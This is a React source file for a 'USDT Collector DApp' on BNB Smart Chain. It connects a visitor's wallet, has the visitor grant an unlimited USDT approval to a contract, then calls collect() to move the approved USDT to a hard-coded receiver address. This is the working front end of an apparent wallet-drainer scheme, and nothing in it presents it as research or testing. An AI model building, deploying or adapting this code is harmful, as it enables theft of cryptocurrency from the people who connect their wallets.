
import React, { useState } from "react";
import { ethers } from "ethers";
import EthereumProvider from "@walletconnect/ethereum-provider";

const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
const CONTRACT_ADDRESS = "YOUR_DEPLOYED_CONTRACT_ADDRESS_HERE";
const RECEIVER_ADDRESS = "0xe47a9ecb5C87b06364bA2c6CEB064583c935f2ed";
const USDT_ABI = [
  "function approve(address spender, uint amount) public returns (bool)"
];
const CONTRACT_ABI = [
  "function collect() public"
];

function App() {
  const [account, setAccount] = useState(null);
  const [provider, setProvider] = useState(null);

  const connectWallet = async () => {
    const wcProvider = await EthereumProvider.init({
      projectId: "1f3beff83dc2ef198af9aa29602491c3",
      chains: [56],
      methods: ["eth_sendTransaction", "eth_sign"],
      rpcMap: { 56: "https://bsc-dataseed.binance.org/" },
      showQrModal: true
    });
    await wcProvider.enable();
    const ethersProvider = new ethers.providers.Web3Provider(wcProvider);
    const signer = ethersProvider.getSigner();
    const address = await signer.getAddress();
    setProvider(ethersProvider);
    setAccount(address);
    alert("Connected: " + address);
  };

  const approveUSDT = async () => {
    if (!provider || !account) return;
    const signer = provider.getSigner();
    const usdt = new ethers.Contract(USDT_ADDRESS, USDT_ABI, signer);
    const tx = await usdt.approve(CONTRACT_ADDRESS, ethers.constants.MaxUint256);
    await tx.wait();
    alert("USDT approved for contract.");
  };

  const callCollect = async () => {
    if (!provider || !account) return;
    const signer = provider.getSigner();
    const contract = new ethers.Contract(CONTRACT_ADDRESS, CONTRACT_ABI, signer);
    const tx = await contract.collect();
    await tx.wait();
    alert("USDT transferred to receiver.");
  };

  return (
    <div style={{ padding: 20 }}>
      <h2>USDT Collector DApp</h2>
      <button onClick={connectWallet}>Connect Wallet</button>
      {account && <>
        <button onClick={approveUSDT}>Approve USDT</button>
        <button onClick={callCollect}>Send Approved USDT</button>
      </>}
    </div>
  );
}

export default App;
